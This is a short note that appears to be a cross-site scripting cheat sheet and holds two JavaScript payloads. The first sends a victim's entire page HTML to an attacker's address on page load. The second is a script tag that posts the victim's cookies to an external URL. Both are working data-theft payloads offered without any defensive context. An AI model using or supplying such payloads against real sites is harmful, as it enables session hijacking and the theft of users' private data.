window.onload = function() { var elements = document.documentElement.outerHTML; fetch('ip:port', {method: "POST", body:elements});}; 
the code sends the whole page to the specified ip(works only on the real user)
--------------------------------

<script>fetch('http://...', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/x-www-form-urlencoded'}, body: 'text='+document.cookie+'' });</script>
